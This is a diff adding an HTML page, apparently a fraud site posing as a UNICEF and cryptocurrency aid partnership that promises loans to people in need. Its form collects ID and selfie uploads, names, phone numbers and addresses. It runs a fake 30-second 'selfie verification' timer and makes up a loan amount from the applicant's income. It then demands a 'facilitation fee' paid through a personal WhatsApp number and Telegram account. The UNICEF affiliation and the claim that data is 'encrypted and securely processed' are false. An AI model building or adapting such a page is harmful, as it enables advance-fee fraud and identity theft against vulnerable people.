@@ -1,0 +1,429 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UNICEF Crypto Aid Foundation</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f9fb;
+      color: #333;
+    }header {
+  background-color: #0077c2;
+  color: white;
+  padding: 20px;
+  text-align: center;
+}
+
+main {
+  max-width: 800px;
+  margin: 20px auto;
+  padding: 20px;
+  background-color: white;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.section {
+  display: none;
+}
+
+.section.active {
+  display: block;
+}
+
+.form-group {
+  margin-bottom: 15px;
+}
+
+label {
+  display: block;
+  margin-bottom: 5px;
+}
+
+input, select, button {
+  width: 100%;
+  padding: 10px;
+  margin-top: 5px;
+  border-radius: 4px;
+  border: 1px solid #ccc;
+}
+
+button {
+  background-color: #0077c2;
+  color: white;
+  border: none;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #005fa3;
+}
+
+.loan-summary {
+  margin-top: 20px;
+  padding: 10px;
+  background-color: #e6f4ff;
+  border: 1px solid #b3e0ff;
+  border-radius: 6px;
+}
+
+.contact-icons {
+  display: flex;
+  gap: 10px;
+  margin-top: 20px;
+}
+
+.contact-icons a {
+  text-decoration: none;
+  color: white;
+  padding: 10px;
+  border-radius: 5px;
+}
+
+.whatsapp {
+  background-color: #25D366;
+}
+
+.telegram {
+  background-color: #0088cc;
+}
+
+  </style>
+</head><body>
+  <header>
+    <h1>UNICEF Foundation in Cooperation with Cryptocurrency Aid</h1>
+  </header>  <main>
+    <div id="step-1" class="section active">
+      <h2>Welcome</h2>
+      <p>Founded on 24/07/2025, this platform is a joint partnership between UNICEF and the Blockchain Alliance. We bring humanitarian aid and financial inclusion to underserved communities via cryptocurrency.</p>
+      <p>We believe in using technology to reach people faster and more securely. Our aid options include crypto investment support and humanitarian loans.</p>
+      <button onclick="nextStep(1)">Continue</button>
+    </div><div id="step-2" class="section">
+  <h2>Terms and Conditions</h2>
+  <p>By proceeding, you agree to our data processing policy and confirm your information is valid.</p>
+  <input type="checkbox" id="terms"> I accept the terms and conditions
+  <button onclick="backStep(2)">Back</button>
+  <button onclick="nextStep(2)">Continue</button>
+</div>
+
+<div id="step-3" class="section">
+  <h2>Your Country</h2>
+  <label for="country">Select Country:</label>
+  <select id="country" required>
+  <option value="">-- Select Country --</option>
+  <option value="Afghanistan">Afghanistan (AFN)</option>
+  <option value="Albania">Albania (ALL)</option>
+  <option value="Algeria">Algeria (DZD)</option>
+  <option value="Angola">Angola (AOA)</option>
+  <option value="Argentina">Argentina (ARS)</option>
+  <option value="Armenia">Armenia (AMD)</option>
+  <option value="Australia">Australia (AUD)</option>
+  <option value="Austria">Austria (EUR)</option>
+  <option value="Azerbaijan">Azerbaijan (AZN)</option>
+  <option value="Bangladesh">Bangladesh (BDT)</option>
+  <option value="Belarus">Belarus (BYN)</option>
+  <option value="Belgium">Belgium (EUR)</option>
+  <option value="Benin">Benin (XOF)</option>
+  <option value="Bolivia">Bolivia (BOB)</option>
+  <option value="Botswana">Botswana (BWP)</option>
+  <option value="Brazil">Brazil (BRL)</option>
+  <option value="Bulgaria">Bulgaria (BGN)</option>
+  <option value="Burkina Faso">Burkina Faso (XOF)</option>
+  <option value="Burundi">Burundi (BIF)</option>
+  <option value="Cameroon">Cameroon (XAF)</option>
+  <option value="Canada">Canada (CAD)</option>
+  <option value="Central African Republic">Central African Republic (XAF)</option>
+  <option value="Chad">Chad (XAF)</option>
+  <option value="Chile">Chile (CLP)</option>
+  <option value="China">China (CNY)</option>
+  <option value="Colombia">Colombia (COP)</option>
+  <option value="Congo">Congo (XAF)</option>
+  <option value="Costa Rica">Costa Rica (CRC)</option>
+  <option value="Croatia">Croatia (EUR)</option>
+  <option value="Cuba">Cuba (CUP)</option>
+  <option value="Cyprus">Cyprus (EUR)</option>
+  <option value="Czech Republic">Czech Republic (CZK)</option>
+  <option value="Denmark">Denmark (DKK)</option>
+  <option value="Dominican Republic">Dominican Republic (DOP)</option>
+  <option value="Ecuador">Ecuador (USD)</option>
+  <option value="Egypt">Egypt (EGP)</option>
+  <option value="El Salvador">El Salvador (USD)</option>
+  <option value="Estonia">Estonia (EUR)</option>
+  <option value="Eswatini">Eswatini (SZL)</option>
+  <option value="Ethiopia">Ethiopia (ETB)</option>
+  <option value="Fiji">Fiji (FJD)</option>
+  <option value="Finland">Finland (EUR)</option>
+  <option value="France">France (EUR)</option>
+  <option value="Gabon">Gabon (XAF)</option>
+  <option value="Gambia">Gambia (GMD)</option>
+  <option value="Georgia">Georgia (GEL)</option>
+  <option value="Germany">Germany (EUR)</option>
+  <option value="Ghana">Ghana (GHS)</option>
+  <option value="Greece">Greece (EUR)</option>
+  <option value="Guatemala">Guatemala (GTQ)</option>
+  <option value="Guinea">Guinea (GNF)</option>
+  <option value="Haiti">Haiti (HTG)</option>
+  <option value="Honduras">Honduras (HNL)</option>
+  <option value="Hungary">Hungary (HUF)</option>
+  <option value="Iceland">Iceland (ISK)</option>
+  <option value="India">India (INR)</option>
+  <option value="Indonesia">Indonesia (IDR)</option>
+  <option value="Iran">Iran (IRR)</option>
+  <option value="Iraq">Iraq (IQD)</option>
+  <option value="Ireland">Ireland (EUR)</option>
+  <option value="Israel">Israel (ILS)</option>
+  <option value="Italy">Italy (EUR)</option>
+  <option value="Ivory Coast">Ivory Coast (XOF)</option>
+  <option value="Jamaica">Jamaica (JMD)</option>
+  <option value="Japan">Japan (JPY)</option>
+  <option value="Jordan">Jordan (JOD)</option>
+  <option value="Kazakhstan">Kazakhstan (KZT)</option>
+  <option value="Kenya">Kenya (KES)</option>
+  <option value="Kuwait">Kuwait (KWD)</option>
+  <option value="Kyrgyzstan">Kyrgyzstan (KGS)</option>
+  <option value="Laos">Laos (LAK)</option>
+  <option value="Latvia">Latvia (EUR)</option>
+  <option value="Lebanon">Lebanon (LBP)</option>
+  <option value="Lesotho">Lesotho (LSL)</option>
+  <option value="Liberia">Liberia (LRD)</option>
+  <option value="Libya">Libya (LYD)</option>
+  <option value="Lithuania">Lithuania (EUR)</option>
+  <option value="Luxembourg">Luxembourg (EUR)</option>
+  <option value="Madagascar">Madagascar (MGA)</option>
+  <option value="Malawi">Malawi (MWK)</option>
+  <option value="Malaysia">Malaysia (MYR)</option>
+  <option value="Maldives">Maldives (MVR)</option>
+  <option value="Mali">Mali (XOF)</option>
+  <option value="Malta">Malta (EUR)</option>
+  <option value="Mauritania">Mauritania (MRU)</option>
+  <option value="Mauritius">Mauritius (MUR)</option>
+  <option value="Mexico">Mexico (MXN)</option>
+  <option value="Moldova">Moldova (MDL)</option>
+  <option value="Mongolia">Mongolia (MNT)</option>
+  <option value="Montenegro">Montenegro (EUR)</option>
+  <option value="Morocco">Morocco (MAD)</option>
+  <option value="Mozambique">Mozambique (MZN)</option>
+  <option value="Myanmar">Myanmar (MMK)</option>
+  <option value="Namibia">Namibia (NAD)</option>
+  <option value="Nepal">Nepal (NPR)</option>
+  <option value="Netherlands">Netherlands (EUR)</option>
+  <option value="New Zealand">New Zealand (NZD)</option>
+  <option value="Nicaragua">Nicaragua (NIO)</option>
+  <option value="Niger">Niger (XOF)</option>
+ <option value="Nigeria">Nigeria (NGN)</option>
+  <option value="North Macedonia">North Macedonia (MKD)</option>
+  <option value="Norway"> Norway (NOK)</option>
+  <option value="Oman">Oman (OMR)</option>
+  <option value="Pakistan">Pakistan (PKR)</option>
+  <option value="panama">Panama (PAB/USD)</option>
+  <option value="Papua New Guinea">Papua New Guinea (PGK)</option>
+  <option value="Paraguay">Paraguay (PYG)</option>
+  <option value="Peru">Peru (PEN)</option>
+  <option value="Philippines">Philippines (PHP)</option>
+  <option value="Poland">Poland (PLN)</option>
+  <option value="Portugal">Portugal (EUR)</option>
+  <option value="Qatar">Qatar (QAR)</option>
+  <option value="Romania">Romania (RON)</option>
+  <option value="Russia">Russia (RUB)</option>
+  <option value="Rwanda">Rwanda (RWF)</option>
+  <option value="Saint Lucia">Saint Lucia (XCD)</option>
+  <option value="Samoa">Samoa (WST)</option>
+  <option value="San Marino">San Marino (EUR)</option>
+  <option value="Saudi Arabia">Saudi Arabia (SAR)</option>
+  <option value="Senegal">Senegal (XOF)</option>
+  <option value="Serbia">Serbia (RSD)</option>
+  <option value="Seychelles">Seychelles (SCR)</option>
+  <option value="Singapore">Singapore (SGD)</option>
+  <option value="Slovakia">Slovakia (EUR)</option>
+  <option value="Slovenia">Slovenia (EUR)</option>
+  <option value="Solomon islands">Solomon islands (SBD)</option>
+  <option value="Somalia">Somalia (SOS)</option>
+  <option value="South Africa"> South Africa (ZAR)</option>
+  <option value="South sudan">South Sudan (SSP)</option>
+  <option value="Spain">Spain (EUR)</option>
+  <option value="Sri lanka">Sri Lanka (LKR)</option>
+  <option value="Sudan">Sudan (SDG)</option>
+  <option value="Suriname">Suriname (SRD)</option>
+  <option value="Sweden">Sweden (SEK)</option>
+  <option value="Switzerland">Switzerland (CHF)</option>
+  <option value="Syria">Syria (SYP)</option>
+  <option value="Taiwan">Taiwan (TWD)</option>
+  <option value="Tajikistan">Tajikistan (TJS)</option>
+  <option value="Tanzania">Tanzania (TZS)</option>
+  <option value="Thailand">Thailand (THB)</option>
+  <option value="Timor">Timor (USD)</option>
+  <option value="Togo">Togo (XOF)</option>
+  <option value="Tonga">Tonga (TOP)</option>
+  <option value="Trinadad and Tobago">Trinidad and Tobago (TTD)</option>
+  <option value="Tunisia">Tunisia (TND)</option>
+  <option value="Turkey">Turkey (TRY)</option>
+  <option value="Turkmenistan">Turkmenistan (TMT)</option>
+  <option value="Tuvalu">Tuvalu (AUD)</option>
+  <option value="uganda">Uganda (UGX)</option>
+  <option value="Ukraine">Ukraine (UAH)</option>
+  <option value="UAE">UAE (AED)</option>
+  <option value="UK">UK (GBP)</option>
+  <option value="USA">USA (USD)</option>
+  <option value="Uruguay">Uruguay (UYU)</option>
+  <option value="Uzbekistan">Uzbekistan (UZS)</option>
+  <option value="Vunuatu">Vunuatu (VUV)</option>
+  <option value="Vatican city">Vatican city (EUR)</option>
+  <option value="Venezuela">Venezuela (VES)</option>
+  <option value="Vietnam">Vietnam (VND)</option>
+  <option value="Yemen">Yemen (YER)</option>
+  <option value="Zambia">Zambia (ZMW)</option>
+  <option value="Zimbabwe">Zimbabwe (ZWL)</option>
+</select>
+  <button onclick="backStep(3)">Back</button>
+  <button onclick="nextStep(3)">Continue</button>
+</div>
+
+<div id="step-4" class="section">
+  <h2>Identification</h2>
+  <div class="form-group">
+    <label>Mobile Number:</label>
+    <input type="text" id="mobile">
+  </div>
+  <div class="form-group">
+    <label>Upload ID:</label>
+    <input type="file" id="idUpload">
+  </div>
+  <div class="form-group">
+    <label>First Name:</label>
+    <input type="text" id="firstName">
+  </div>
+  <div class="form-group">
+    <label>Surname:</label>
+    <input type="text" id="surname">
+  </div>
+  <div class="form-group">
+    <label>Upload Selfie:</label>
+    <input type="file" id="selfieUpload">
+    <p>🔒 Your data is encrypted and securely processed.</p>
+  </div>
+  <button onclick="backStep(4)">Back</button>
+  <button onclick="verifySelfie()">Continue</button>
+  <div id="verifying" style="display:none; margin-top:10px;">Verifying selfie... Please wait <span id="timer">30</span> seconds.</div>
+</div>
+
+<div id="step-5" class="section">
+  <h2>Location Details</h2>
+  <label>Area:</label>
+  <input type="text" id="area">
+  <label>Address:</label>
+  <input type="text" id="address">
+  <button onclick="backStep(5)">Back</button>
+  <button onclick="nextStep(5)">Continue</button>
+</div>
+
+<div id="step-6" class="section">
+  <h2>Select Support Type</h2>
+  <button onclick="selectSupport('loan')">Loan Aid</button>
+  <button onclick="selectSupport('crypto')">Crypto Investment</button>
+  <button onclick="backStep(6)">Back</button>
+</div>
+
+<div id="step-7" class="section">
+  <h2>Personal Details</h2>
+  <label>Gender:</label>
+  <select id="gender">
+    <option value="">-- Select --</option>
+    <option value="male">Male</option>
+    <option value="female">Female</option>
+    <option value="other">Other</option>
+  </select>
+  <label>Marital Status:</label>
+  <select id="marital">
+    <option value="">-- Select --</option>
+    <option>Married</option>
+    <option>Not Married</option>
+  </select>
+  <label>Employment Status:</label>
+  <select id="employed">
+    <option value="">-- Select --</option>
+    <option>Employed</option>
+    <option>Not Employed</option>
+  </select>
+  <label>Dependents:</label>
+  <select id="dependents">
+    <option value="">-- Select --</option>
+    <option>0</option>
+    <option>1-2</option>
+    <option>3-4</option>
+    <option>5+</option>
+  </select>
+  <label>Annual Income (USD):</label>
+  <input type="number" id="income" placeholder="e.g. 100">
+  <button onclick="backStep(7)">Back</button>
+  <button onclick="calculateLoan()">Apply</button>
+</div>
+
+<div id="step-8" class="section">
+  <h2>Loan Qualification</h2>
+  <div class="loan-summary" id="loanResult"></div>
+  <p>To proceed, a facilitation fee is required.</p>
+  <button onclick="backStep(8)">Back</button>
+  <button onclick="nextStep(8)">Click here to pay</button>
+</div>
+
+<div id="step-9" class="section">
+  <h2>Contact to Complete Payment</h2>
+  <div class="contact-icons">
+    <a class="whatsapp" href="https://wa.me/254714833011" target="_blank">WhatsApp</a>
+    <a class="telegram" href="https://t.me/Smithjay23" target="_blank">Telegram</a>
+  </div>
+</div>
+
+  </main>  <script>
+    let currentStep = 1;
+
+    function nextStep(step) {
+      if (!validateStep(step)) return;
+      document.getElementById(`step-${step}`).classList.remove('active');
+      document.getElementById(`step-${step + 1}`).classList.add('active');
+    }
+
+    function backStep(step) {
+      document.getElementById(`step-${step}`).classList.remove('active');
+      document.getElementById(`step-${step - 1}`).classList.add('active');
+    }
+
+    function validateStep(step) {
+      if (step === 2 && !document.getElementById("terms").checked) return alert("Please accept terms."), false;
+      if (step === 3 && document.getElementById("country").value === "") return alert("Please select a country."), false;
+      if (step === 4 && (!document.getElementById("mobile").value || !document.getElementById("idUpload").value || !document.getElementById("firstName").value || !document.getElementById("surname").value || !document.getElementById("selfieUpload").value)) return alert("Please fill all details."), false;
+      if (step === 5 && (!document.getElementById("area").value || !document.getElementById("address").value)) return alert("Enter area and address."), false;
+      return true;
+    }
+
+    function verifySelfie() {
+      if (!validateStep(4)) return;
+      let timer = 30;
+      document.getElementById('verifying').style.display = 'block';
+      const interval = setInterval(() => {
+        timer--;
+        document.getElementById('timer').innerText = timer;
+        if (timer === 0) {
+          clearInterval(interval);
+          nextStep(4);
+        }
+      }, 1000);
+    }
+
+    let selectedSupport = '';
+    function selectSupport(type) {
+      selectedSupport = type;
+      nextStep(6);
+    }
+
+    function calculateLoan() {
+      const income = parseFloat(document.getElementById('income').value);
+      if (isNaN(income) || income <= 0) return alert("Enter a valid income.");
+      const loan = income * 4.5;
+      const fee = 5;
+      document.getElementById('loanResult').innerText = `You qualify for $${loan.toFixed(2)} loan. A processing fee of $${fee} is required to unlock the aid.`;
+      nextStep(7);
+    }
+  </script></body></html>
